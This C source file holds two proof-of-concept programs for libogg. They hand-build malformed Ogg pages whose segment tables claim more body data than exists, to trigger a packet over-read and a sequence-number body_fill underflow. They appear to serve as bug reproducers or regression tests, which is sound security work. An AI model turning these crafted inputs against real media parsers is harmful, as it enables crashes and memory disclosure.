/* Stateful PoCs for lacing/body over-read and sequence-number underflow.
 * Builds pages by hand (no sync/CRC gate) and feeds them into one
 * ogg_stream_state, then drains packets to reach the vulnerable code.
 */

#include <stdio.h>
#include <string.h>
#include <ogg/ogg.h>

#define SERIAL 0x04030201u

static void set_serial(unsigned char *header) {
  header[14] = (unsigned char)(SERIAL & 0xff);
  header[15] = (unsigned char)((SERIAL >> 8) & 0xff);
  header[16] = (unsigned char)((SERIAL >> 16) & 0xff);
  header[17] = (unsigned char)((SERIAL >> 24) & 0xff);
}

static ogg_page make_page(unsigned char *buf, const unsigned char *header,
                          int hlen, const unsigned char *body, int blen) {
  ogg_page og;
  memset(&og, 0, sizeof(og));
  memcpy(buf, header, (size_t)hlen);
  memcpy(buf + hlen, body, (size_t)blen);
  og.header = buf;
  og.header_len = hlen;
  og.body = buf + hlen;
  og.body_len = blen;
  return og;
}

/* page: BOS, segment table claims a complete 275-byte packet (255+20),
   but only 64 body bytes are actually present. */
static void poc_lacing_overread(void) {
  ogg_stream_state os;
  ogg_stream_init(&os, (int)SERIAL);
  enum { NSEG = 255 };
  unsigned char buf[60000];
  unsigned char header[27 + NSEG + 1];
  memset(header, 0, sizeof(header));
  memcpy(header, "OggS", 4);
  header[5] = 0x02;                 /* BOS */
  header[26] = (unsigned char)NSEG; /* max segment table */
  for (int i = 0; i < NSEG - 1; i++)
    header[27 + i] = 255;           /* claims ~65 KB of body ... */
  header[27 + NSEG - 1] = 20;       /* ...and a terminating full packet */
  set_serial(header);
  unsigned char body[64];
  memset(body, 0xAB, sizeof(body));

  ogg_page og = make_page(buf, header, 27 + NSEG, body,
                          (int)sizeof(body));
  int rc = ogg_stream_pagein(&os, &og);
  printf("lacing-overread pagein rc=%d body_fill=%ld\n", rc, os.body_fill);

  ogg_packet op;
  memset(&op, 0, sizeof(op));
  int prc = ogg_stream_packetout(&os, &op);
  printf("lacing-overread packetout rc=%d bytes=%ld\n", prc, op.bytes);
  if (prc == 1) {
    volatile unsigned char sink = 0;
    for (long i = 0; i < op.bytes; i++) {
      sink ^= op.packet[i];           /* reads 211 bytes past the 64 stored */
    }
    (void)sink;
  }
  ogg_stream_clear(&os);
}

/* valid BOS page, then a backwards-numbered page whose lacing claims more
   than its body; the gap unroll must not drive body_fill negative. */
static void poc_seq_underflow(void) {
  ogg_stream_state os;
  ogg_stream_init(&os, (int)SERIAL);
  unsigned char buf[1024];

  unsigned char h0[28];
  memset(h0, 0, sizeof(h0));
  memcpy(h0, "OggS", 4);
  h0[5] = 0x02; h0[26] = 1; h0[27] = 10;
  set_serial(h0);
  unsigned char b0[10];
  memset(b0, 1, sizeof(b0));
  ogg_page p0 = make_page(buf, h0, 28, b0, 10);
  ogg_stream_pagein(&os, &p0);

  unsigned char h1[29];
  memset(h1, 0, sizeof(h1));
  memcpy(h1, "OggS", 4);
  h1[26] = 2;                     /* 2 segments */
  h1[27] = 255; h1[28] = 255;     /* claims 510 bytes */
  h1[18] = 0;                     /* page number 0: backwards jump */
  set_serial(h1);
  unsigned char b1[40];
  memset(b1, 2, sizeof(b1));
  ogg_page p1 = make_page(buf, h1, 29, b1, (int)sizeof(b1));
  int rc = ogg_stream_pagein(&os, &p1);
  printf("seq-underflow pagein rc=%d body_fill=%ld lacing_fill=%ld\n",
         rc, os.body_fill, os.lacing_fill);
  ogg_stream_clear(&os);
}

int main(void) {
  poc_lacing_overread();
  poc_seq_underflow();
  printf("poc completed\n");
  return 0;
}
